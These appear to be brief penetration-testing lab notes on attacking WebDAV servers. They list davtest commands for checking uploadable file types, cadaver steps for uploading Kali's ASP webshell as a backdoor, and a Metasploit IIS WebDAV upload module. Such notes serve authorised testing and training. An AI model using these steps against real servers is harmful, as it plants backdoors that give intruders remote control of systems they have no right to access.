Webdav
WebDAV, or Web Distributed Authoring and Versioning, is a set of extensions to the Hypertext Transfer Protocol (HTTP) that allows user agents to collaboratively 
author and manage files on a web server. It provides a framework for users to create, change, and move documents, as well as delete or copy files and folders. 
WebDAV also includes features such as file locking, versioning, and search.

Running davtest tool
-davtest -url http://10.0.16.177/webdav

Accessing with credentials
- davtest -auth <USER>:<PASSWORD> -url <URL>
The previous command will show a run down of the type of files and such that can be uploaded

Upload a .asp backdoor on the target machine to /webdav directory using cadaver utility.
- cadaver <url>
Using the built in kali shells, we will upload an .asp shell
- put /usr/share/webshells/asp/webshell.asp

Exploiting IIS server using METASPLOIT
First, we have to check for the directory. We run an http enum script
-nmap --script http-enum -sV -p 80 <target>
after finding the webdav directory, we use this msfconsole module
-use exploit/windows/iis/iis_webdav_upload_asp
-set PATH /webdav/metasploit%RAND%.asp
